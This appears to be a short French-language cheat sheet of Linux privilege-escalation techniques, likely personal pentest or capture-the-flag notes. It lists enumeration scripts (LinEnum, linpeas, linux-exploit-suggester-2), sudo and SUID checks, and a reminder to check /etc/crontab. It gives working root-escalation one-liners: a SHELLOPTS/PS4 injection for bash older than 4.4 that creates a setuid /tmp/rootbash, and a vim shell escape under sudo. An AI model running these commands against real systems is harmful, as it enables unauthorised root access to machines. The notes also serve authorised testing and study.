Script Linux [PrivEsc](cheat_sheet--PrivEsc_5.html) detection basic :

[https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh)

chmod +x LinEnum.sh

./LinEnum

Listez les programmes que l'utilisateur peux executer en tant que root :

sudo -l

trouvé un fichier qui a des droit suid :

find / -perm -u=s -type f 2>/dev/null

si un fichier s'execute en tant que root et que la vesion de bin/bash est inferieur a la 4.4 :

env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' <CHEMIN DU FICHIER>

puis :

/tmp/rootbash -p

envoie de fichier via ssh :

scp <Utilisateur>@<Hôte>:<Répertoire/Fichier.Extension>

utiliser le fichier clé ssh root depuis sa machine pour se connecter en tant que root :

chmod 600 root_key

a utiliser en dernier recours perl file :

[https://github.com/jondonas/linux-exploit-suggester-2/blob/master/linux-exploit-suggester-2.pl](https://github.com/jondonas/linux-exploit-suggester-2/blob/master/linux-exploit-suggester-2.pl)

puis :

perl linux-exploit-suggester-2.pl

outils de recherche d'escalate de privilege :

LinEnum.sh linpeas.sh lse.sh

bien analyser l'utilité des fichier utiliser en tant que root pour les exploiter ensuite

sous linux :

toujour aller voir le fichier /etc/crontab

si vim est autoriser en sudo :

	sudo /usr/bin/vim -c ':!/bin/bash'
